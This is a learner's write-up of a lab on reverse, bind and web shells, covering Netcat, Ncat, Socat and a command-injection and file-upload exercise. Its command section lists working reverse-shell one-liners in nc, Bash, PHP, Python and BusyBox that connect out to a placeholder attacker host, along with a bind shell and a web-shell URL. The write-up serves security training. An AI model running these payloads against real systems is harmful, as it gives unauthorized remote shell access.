# Shells - [11-23-2026]

## What This Covers

This lab covers different types of shells used in offensive security and how they provide remote access to compromised systems. It explores the differences between reverse shells, bind shells, and web shells, including how connections are established and how an attacker can interact with a remote system. I worked with Netcat to understand how to configure listeners and establish remote shell connections, explored additional listener utilities such as rlwrap, Ncat, and Socat, and studied different shell payload techniques using Bash, PHP, Python, Telnet, AWK, and BusyBox. The lab also demonstrates how web shells can be deployed through vulnerabilities such as command injection and unrestricted file upload. Finally, I applied these concepts in a practical exercise involving a vulnerable web server with separate endpoints for command injection and unrestricted file upload, where the objective was to obtain shell access and locate flags stored in the root directory.

## Key Concepts

* Understanding shells as command-line interfaces that allow users to interact with an operating system.
* Understanding how attackers use shell access for remote system control, privilege escalation, data exfiltration, persistence, and post-exploitation activities.
* Understanding pivoting and how a compromised machine can be used as a launching point to access other systems within a network.
* Understanding reverse shells, where the compromised target initiates a connection back to the attacker's machine.
* Configuring a Netcat listener to receive incoming reverse shell connections.
* Understanding the use of Netcat options such as `-l`, `-v`, `-n`, and `-p`.
* Understanding named pipes (FIFO) and how `mkfifo` helps establish bidirectional communication between processes.
* Understanding file descriptor redirection and the use of standard input, standard output, and standard error in shell connections.
* Understanding bind shells, where the compromised target listens on a specific port for incoming connections from the attacker.
* Understanding the difference between reverse shells and bind shells based on connection direction.
* Understanding why ports below 1024 generally require root or elevated privileges to bind.
* Using `rlwrap` to improve shell interaction with command history and arrow-key support.
* Understanding Ncat as an improved version of Netcat with additional features, including SSL encryption.
* Using Socat to create socket connections between different data sources and configure TCP listeners.
* Exploring Bash reverse shell techniques using `/dev/tcp` and file descriptors.
* Understanding PHP reverse shell techniques using functions such as `exec()`, `shell_exec()`, `system()`, `passthru()`, and `popen()`.
* Exploring Python reverse shells using the socket and subprocess modules, along with file descriptor redirection and PTY spawning.
* Understanding alternative reverse shell techniques using Telnet, AWK, and BusyBox.
* Understanding web shells as server-side scripts that allow remote command execution through a web application.
* Identifying commonly used web shell languages such as PHP, ASP, JSP, and CGI.
* Understanding how unrestricted file upload and other web application vulnerabilities can be abused to deploy web shells.
* Exploring existing PHP web shells such as p0wny-shell, b374k shell, and c99 shell.
* Understanding how command injection and unrestricted file upload can provide different paths to remote shell access.

## Commands/Tools Used

```bash
# Reverse Shell - Netcat Listener:
nc -lvnp 443

# Named Pipe Reverse Shell:
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f


# Bind Shell - Target Side:
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f

# Bind Shell - Attacker Side:
nc -nv TARGET_IP 8080


# Shell Listener with Readline Support:
rlwrap nc -lvnp 443

# Ncat Listener:
ncat -lvnp 4444

# Ncat Listener with SSL:
ncat --ssl -lvnp 4444

# Socat TCP Listener:
socat -d -d TCP-LISTEN:443 STDOUT


# Bash Reverse Shell:
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1

# Bash Reverse Shell Using File Descriptor 5:
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5


# PHP Reverse Shell Using exec():
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'

# PHP Reverse Shell Using shell_exec():
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'

# PHP Reverse Shell Using system():
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'


# Python Reverse Shell:
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")'

# Python Reverse Shell Using subprocess:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'


# BusyBox Netcat Reverse Shell:
busybox nc ATTACKER_IP 443 -e sh


# Web Shell Access Example:
http://victim.com/uploads/shell.php?cmd=whoami


# Practical Lab Endpoints:
http://MACHINE_IP:8080
http://MACHINE_IP:8081
http://MACHINE_IP:8082
```

## What I learned

I learned how different types of shells work and how they can be used to establish remote access to a system. I started by understanding the role of shells in operating system interaction and post-exploitation activities. I then explored reverse shells using Netcat, where the target connects back to the attacker's listening machine, and bind shells, where the target opens a port and waits for an incoming connection. I practised understanding named pipes, file descriptors, input/output redirection, and the commands required to establish these connections. I also explored different listener utilities, including rlwrap, Ncat, and Socat, and understood their additional features. After that, I studied reverse shell payload techniques using Bash, PHP, Python, Telnet, AWK, and BusyBox. I also learned how PHP web shells receive commands through HTTP GET parameters and how vulnerabilities such as command injection and unrestricted file upload can be abused to deploy them. Finally, I applied these concepts in the practical lab, which involved exploiting a command injection vulnerability on port 8081 and an unrestricted file upload vulnerability on port 8082 to obtain shell access and locate the flags stored in the root directory.
